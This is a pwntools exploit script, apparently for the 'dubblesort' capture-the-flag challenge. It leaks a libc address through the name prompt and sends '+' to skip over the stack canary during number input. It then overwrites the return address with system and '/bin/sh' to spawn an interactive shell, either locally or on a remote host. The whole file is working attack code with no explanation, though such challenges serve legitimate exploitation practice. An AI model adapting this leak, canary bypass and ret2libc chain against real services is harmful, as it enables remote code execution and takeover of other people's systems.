from pwn import *
# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './dubblesort_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
rop = ROP(exe)
libc = ELF('./libc_32.so.6')

payload = b'a' * 24
p.recvuntil(b'name :')
p.sendline(payload)
p.recvuntil(b'a'*24)
leak = u32(p.recv(4))
info('leak: ' + hex(leak))
libc.address = leak - 0x0a - 0x1b0000
info('libc.address: ' + hex(libc.address))
system = libc.symbols['system']
info('system: ' + hex(system))
bin_sh = next(libc.search(b'/bin/sh'))
info('bin_sh: ' + hex(bin_sh))
p.sendlineafter(b'sort :', b'35')
for i in range(24):
    p.sendlineafter(b'number :', b'1')
p.sendlineafter(b'number :', b'+')
for i in range(8):
    p.sendlineafter(b'number :', str(system).encode())
p.sendlineafter(b'number :', str(bin_sh).encode())
p.sendlineafter(b'number :', str(bin_sh).encode())

p.interactive()